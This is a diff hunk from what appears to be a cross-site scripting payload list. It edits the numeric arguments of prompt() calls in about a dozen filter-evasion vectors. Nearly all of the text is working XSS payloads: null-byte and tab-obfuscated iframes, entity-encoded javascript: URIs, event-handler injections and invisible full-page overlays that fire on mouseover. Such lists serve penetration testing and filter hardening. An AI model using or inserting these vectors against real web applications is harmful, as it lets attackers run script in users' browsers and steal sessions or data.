@@ -34,7 +34,7 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 
 
 
-<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+<iframe %00 src="&Tab;javascript:prompt(122)&Tab;"%00>
 <ScRipT 5-0*3+9/3=>prompt(2)</ScRipT giveanswerhere=?
 </script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
 <img/&#09;&#10;&#11; src=`~` onerror=prompt(3)>
@@ -95,15 +95,15 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 <img/src=@&#32;&#13; onerror = prompt('&#49;')
 <style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
 <iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
-<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
-/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
-<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
-</plaintext\></|\><plaintext/onmouseover=prompt(1)
-<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(180980)
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1125125) /*iframe/src*/>
+<a/href="javascript:&#13; javascript:prompt(1125125)"><input type="X">
+</plaintext\></|\><plaintext/onmouseover=prompt(1251251251)
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1125125)">
 <var onmouseover="prompt(1)">On Mouse Over</var>
-<img src="/" =_=" title="onerror='prompt(1)'">
-<iframe/src \/\/onload = prompt(1)
-<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
+<img src="/" =_=" title="onerror='prompt(1125125125)'">
+<iframe/src \/\/onload = prompt(1251251)
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(15555555)" onclick="alert(1)">x</button>
 
 
 
